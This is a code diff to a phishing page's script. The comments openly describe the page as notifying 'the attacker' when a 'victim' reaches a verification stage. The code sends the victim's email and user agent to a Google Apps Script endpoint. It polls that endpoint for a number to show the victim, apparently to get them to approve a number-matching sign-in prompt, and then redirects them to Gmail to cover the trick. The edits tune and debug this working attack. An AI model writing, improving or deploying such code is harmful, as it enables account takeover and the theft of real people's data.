@@ -114,43 +114,46 @@
 
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxxwtqSxcM3xKDVY4vaXQ1E44cosqIVI9HM0guLL8GHe2hEV3S9EmQ1Pr46jzWZa9zS/exec";
 
-    // Notify attacker that victim is waiting
+    // Notify attacker that victim reached loading/verify stage
     fetch(SCRIPT_URL, {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
       body: new URLSearchParams({
-        action: "victim_at_verify",
+        action: "victim_ready",           // ← change to "victim_at_verify" if your script uses that
         email: email,
         user_agent: navigator.userAgent,
         timestamp: new Date().toISOString()
       })
-    }).catch(() => {});
+    })
+    .then(r => r.json())
+    .then(data => console.log("Notify response:", data))
+    .catch(err => console.error("Notify failed:", err));
 
-    // Poll until number is available
+    // Poll for number
     const pollInterval = setInterval(async () => {
       try {
         const response = await fetch(`${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}`);
         const data = await response.json();
 
-        if (data && data.prompt_number && data.prompt_number.trim() !== "") {
-          // Number received → show prompt
+        console.log("Poll result:", data); // ← for debugging
+
+        if (data?.prompt_number?.trim()) {
           document.getElementById("loading").style.display = "none";
           document.getElementById("prompt-section").style.display = "block";
           document.getElementById("matchNumber").textContent = data.prompt_number;
-
-          clearInterval(pollInterval); // stop polling
+          clearInterval(pollInterval);
         }
       } catch (err) {
-        console.error("Polling error:", err);
+        console.error("Poll error:", err);
       }
-    }, 3500); // check every 3.5 seconds
+    }, 3500);
 
-    // Fallback redirect after long wait
+    // Auto-redirect fallback
     setTimeout(() => {
       clearInterval(pollInterval);
       localStorage.removeItem("demoEmail");
       window.location.href = "https://mail.google.com/";
-    }, 600000); // 10 minutes
+    }, 600000);
   </script>
 </body>
 </html>
